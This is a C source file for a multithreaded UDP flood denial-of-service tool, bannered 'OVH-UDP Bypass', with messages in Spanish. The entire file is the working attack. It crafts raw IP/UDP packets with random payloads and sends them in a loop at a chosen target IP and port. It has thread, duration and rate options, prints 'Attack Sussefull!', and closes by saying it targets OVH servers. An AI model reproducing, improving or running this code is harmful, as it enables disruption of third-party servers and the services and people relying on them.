#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <math.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <errno.h>

#define MAX_PACKET_SIZE 4096
#define DEFAULT_PACKET_SIZE 512
#define DEFAULT_PORT 80
#define DEFAULT_THREADS 10
#define DEFAULT_DURATION 30

static volatile sig_atomic_t running = 1;
static atomic_uint total_packets_sent = 0;
static atomic_uint packets_per_second = 0;

typedef struct {
    char target_ip[INET_ADDRSTRLEN];
    unsigned short target_port;
    unsigned int thread_id;
    unsigned int min_packet_size;
    unsigned int max_packet_size;
    unsigned int packets_per_second_limit;
    bool verbose;
} thread_params_t;

typedef struct {
    unsigned int packets_sent;
    unsigned int bytes_sent;
    double start_time;
    double end_time;
} thread_stats_t;

void signal_handler(int sig);
unsigned short calculate_checksum(unsigned short *ptr, int nbytes);
uint32_t get_external_ip(void);
void generate_random_data(char *buffer, size_t size);
void setup_ip_header(struct iphdr *ip, uint32_t source, uint32_t dest, size_t total_len);
void setup_udp_header(struct udphdr *udp, unsigned short source_port, unsigned short dest_port, size_t data_len);
void *udp_flood_thread(void *arg);
void print_statistics(double start_time, double end_time, unsigned int total_threads);
void print_banner(void);
void validate_parameters(const char *ip, unsigned short port, unsigned int threads, 
                        unsigned int duration, unsigned int min_size, unsigned int max_size);

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("\n[!] Recibida señal de terminación. Deteniendo...\n");
        running = 0;
    }
}

unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

uint32_t get_external_ip(void) {
    int sock;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("[!] Error creando socket para obtener IP externa");
        return INADDR_ANY;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[!] Error conectando para obtener IP externa");
        close(sock);
        return INADDR_ANY;
    }

    getsockname(sock, (struct sockaddr *)&addr, &addr_len);
    close(sock);
    
    return addr.sin_addr.s_addr;
}

void generate_random_data(char *buffer, size_t size) {
    static unsigned int seed = 0;
    
    if (seed == 0) {
        seed = time(NULL) ^ getpid();
        srand(seed);
    }

    for (size_t i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

void setup_ip_header(struct iphdr *ip, uint32_t source, uint32_t dest, size_t total_len) {
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + total_len);
    ip->id = htons(rand() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = source;
    ip->daddr = dest;
    
    ip->check = calculate_checksum((unsigned short *)ip, sizeof(struct iphdr));
}

void setup_udp_header(struct udphdr *udp, unsigned short source_port, unsigned short dest_port, size_t data_len) {
    udp->source = htons(source_port);
    udp->dest = htons(dest_port);
    udp->len = htons(sizeof(struct udphdr) + data_len);
    udp->check = 0;
}

void *udp_flood_thread(void *arg) {
    thread_params_t *params = (thread_params_t *)arg;
    thread_stats_t stats = {0};
    
    struct sockaddr_in dest_addr;
    char packet_buffer[MAX_PACKET_SIZE];
    struct iphdr *ip_header = (struct iphdr *)packet_buffer;
    struct udphdr *udp_header = (struct udphdr *)(packet_buffer + sizeof(struct iphdr));
    char *data = packet_buffer + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    int raw_socket;
    int on = 1;
    
    if ((raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        perror("[!] Error creando socket raw");
        pthread_exit(NULL);
    }
    
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("[!] Error configurando IP_HDRINCL");
        close(raw_socket);
        pthread_exit(NULL);
    }
    
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->target_port);
    dest_addr.sin_addr.s_addr = inet_addr(params->target_ip);
    
    uint32_t source_ip = get_external_ip();
    
    unsigned short source_port = 1024 + (rand() % 64511);
    
    stats.start_time = (double)clock() / CLOCKS_PER_SEC;
    
    while (running) {
        size_t data_size = params->min_packet_size + 
                          (rand() % (params->max_packet_size - params->min_packet_size + 1));
        
        generate_random_data(data, data_size);
        
        setup_ip_header(ip_header, source_ip, dest_addr.sin_addr.s_addr, data_size);
        setup_udp_header(udp_header, source_port, params->target_port, data_size);
        
        ssize_t sent = sendto(raw_socket, packet_buffer, 
                             sizeof(struct iphdr) + sizeof(struct udphdr) + data_size,
                             0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        
        if (sent > 0) {
            atomic_fetch_add(&total_packets_sent, 1);
            atomic_fetch_add(&packets_per_second, 1);
            stats.packets_sent++;
            stats.bytes_sent += sent;
            
            if (params->packets_per_second_limit > 0) {
                static unsigned int local_pps_counter = 0;
                static time_t last_time = 0;
                time_t current_time = time(NULL);
                
                if (current_time != last_time) {
                    local_pps_counter = 0;
                    last_time = current_time;
                }
                
                local_pps_counter++;
                if (local_pps_counter >= params->packets_per_second_limit) {
                    usleep(1000000 / params->packets_per_second_limit);
                }
            }
        }
        
        source_port = 1024 + (rand() % 64511);
    }
    
    stats.end_time = (double)clock() / CLOCKS_PER_SEC;
    close(raw_socket);
    
    thread_stats_t *result = malloc(sizeof(thread_stats_t));
    if (result) {
        *result = stats;
    }
    
    pthread_exit(result);
}

void validate_parameters(const char *ip, unsigned short port, unsigned int threads, 
                        unsigned int duration, unsigned int min_size, unsigned int max_size) {
    
    struct sockaddr_in sa;
    if (inet_pton(AF_INET, ip, &(sa.sin_addr)) == 0) {
        fprintf(stderr, "[!] Error: Dirección IP inválida: %s\n", ip);
        exit(EXIT_FAILURE);
    }
    
    if (port == 0 || port > 65535) {
        fprintf(stderr, "[!] Error: Puerto inválido: %d\n", port);
        exit(EXIT_FAILURE);
    }
    
    if (threads == 0 || threads > 1000) {
        fprintf(stderr, "[!] Error: Número de hilos inválido: %d (1-1000)\n", threads);
        exit(EXIT_FAILURE);
    }
    
    if (duration == 0 || duration > 3600) {
        fprintf(stderr, "[!] Error: Duración inválida: %d segundos (1-3600)\n", duration);
        exit(EXIT_FAILURE);
    }
    
    if (min_size < 20 || max_size > MAX_PACKET_SIZE || min_size > max_size) {
        fprintf(stderr, "[!] Error: Tamaño de paquetes inválido: %d-%d (20-%d)\n", 
                min_size, max_size, MAX_PACKET_SIZE);
        exit(EXIT_FAILURE);
    }
}

void print_banner(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║      OVH-UDP Bypass                              ║\n");
    printf("║                                                  ║\n");
    printf("║      pito                                        ║\n");
    printf("║                                                  ║\n");
    printf("║                                                  ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("\n");
}

void print_statistics(double start_time, double end_time, unsigned int total_threads) {
    double elapsed = end_time - start_time;
    unsigned int total_packets = atomic_load(&total_packets_sent);
    
    printf("\n══════════════════════════════════════════════════\n");
    printf("                ESTADÍSTICAS FINALES\n");
    printf("══════════════════════════════════════════════════\n");
    printf("  Tiempo total:          %.2f segundos\n", elapsed);
    printf("  Paquetes enviados:     %u paquetes\n", total_packets);
    printf("  Tasa promedio:         %.2f paquetes/segundo\n", total_packets / elapsed);
    printf("  Hilos utilizados:      %u hilos\n", total_threads);
    printf("  Paquetes por hilo:     %.1f paquetes/hilo\n", (float)total_packets / total_threads);
    printf("══════════════════════════════════════════════════\n");
}

int main(int argc, char *argv[]) {
    unsigned short target_port = DEFAULT_PORT;
    unsigned int num_threads = DEFAULT_THREADS;
    unsigned int duration = DEFAULT_DURATION;
    unsigned int pps_limit = 0;
    unsigned int min_packet_size = 64;
    unsigned int max_packet_size = DEFAULT_PACKET_SIZE;
    
    print_banner();
    
    if (getuid() != 0) {
        fprintf(stderr, "[!] Error: Este programa requiere permisos de root\n");
        fprintf(stderr, "[!] Ejecutar con: sudo %s <args>\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    if (argc < 2) {
        printf("sudo ./ovhudpv4 <IP_DESTINO> [OPCIONES]\n\n", argv[0]);
        printf("Opciones:\n");
        printf("  -p PORT      Puerto destino (default: %d)\n", DEFAULT_PORT);
        printf("  -t THREADS   Número de hilos (default: %d)\n", DEFAULT_THREADS);
        printf("  -d SECONDS   Duración en segundos (default: %d)\n", DEFAULT_DURATION);
        printf("  -l PPS       Límite de paquetes/segundo (0=sin límite)\n");
        printf("  -min BYTES   Tamaño mínimo de paquete (default: 64)\n");
        printf("  -max BYTES   Tamaño máximo de paquete (default: %d)\n", DEFAULT_PACKET_SIZE);
        printf("  -v           Modo verbose\n\n");
        
        printf("Ejemplo:\n");
        printf("  sudo %s 192.168.1.100 -p 80 -t 32 -d 30\n", argv[0]);
        
        return EXIT_FAILURE;
    }
    
    char *target_ip = argv[1];
    
    bool verbose = false;
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            target_port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            num_threads = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            duration = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) {
            pps_limit = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-min") == 0 && i + 1 < argc) {
            min_packet_size = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-max") == 0 && i + 1 < argc) {
            max_packet_size = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-v") == 0) {
            verbose = true;
        }
    }
    
    validate_parameters(target_ip, target_port, num_threads, duration, min_packet_size, max_packet_size);
    
    printf("[+] Attack Sussefull!:\n");
    printf("    IP:         %s\n", target_ip);
    printf("    Puerto:             %d\n", target_port);
    printf("    Hilos:              %d\n", num_threads);
    printf("    Duración:           %d segundos\n", duration);
    printf("    Límite PPS:         %s\n", pps_limit > 0 ? "Activado" : "Desactivado");
    if (pps_limit > 0) printf("    PPS por hilo:       %d\n", pps_limit / num_threads);
    printf("    Tamaño paquetes:    %d-%d bytes\n", min_packet_size, max_packet_size);
    printf("\n");
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    srand(time(NULL) ^ getpid());
    
    pthread_t threads[num_threads];
    thread_params_t params[num_threads];
    
    printf("[+] Iniciando %d...\n", num_threads);
    
    for (unsigned int i = 0; i < num_threads; i++) {
        strncpy(params[i].target_ip, target_ip, INET_ADDRSTRLEN);
        params[i].target_port = target_port;
        params[i].thread_id = i;
        params[i].min_packet_size = min_packet_size;
        params[i].max_packet_size = max_packet_size;
        params[i].packets_per_second_limit = pps_limit / num_threads;
        params[i].verbose = verbose;
        
        if (pthread_create(&threads[i], NULL, udp_flood_thread, &params[i]) != 0) {
            perror("[!] Error creando hilo");
            running = 0;
            break;
        }
    }
    
    printf("\n[+] Presiona Ctrl+C para detener\n\n");
    
    time_t start_time = time(NULL);
    time_t last_print = start_time;
    unsigned int last_packet_count = 0;
    
    while (running && (time(NULL) - start_time) < duration) {
        time_t current_time = time(NULL);
        
        if (current_time != last_print) {
            unsigned int current_packets = atomic_load(&packets_per_second);
            printf("[+] Paquetes/seg: %6u | Total: %8u | Tiempo: %3ld/%3d s\r",
                   current_packets, 
                   atomic_load(&total_packets_sent),
                   current_time - start_time,
                   duration);
            
            fflush(stdout);
            atomic_store(&packets_per_second, 0);
            last_print = current_time;
        }
        
        usleep(100000);
    }
    
    printf("\n\n[+] Terminando prueba...\n");
    running = 0;
    
    unsigned long total_bytes = 0;
    unsigned long total_packets = 0;
    
    for (unsigned int i = 0; i < num_threads; i++) {
        void *thread_result;
        pthread_join(threads[i], &thread_result);
        
        if (thread_result) {
            thread_stats_t *stats = (thread_stats_t *)thread_result;
            total_packets += stats->packets_sent;
            total_bytes += stats->bytes_sent;
            free(stats);
        }
    }
    
    time_t end_time = time(NULL);
    print_statistics(start_time, end_time, num_threads);
    
    printf("\n[+] Attack finish\n");
    printf("[+] RECUERDA: Este codigo esta hecho para atacar servers de ovh basura\n");
    printf("[+] El uso malicioso de esta porquería puede ser ilegal\n\n");
    
    return EXIT_SUCCESS;
}
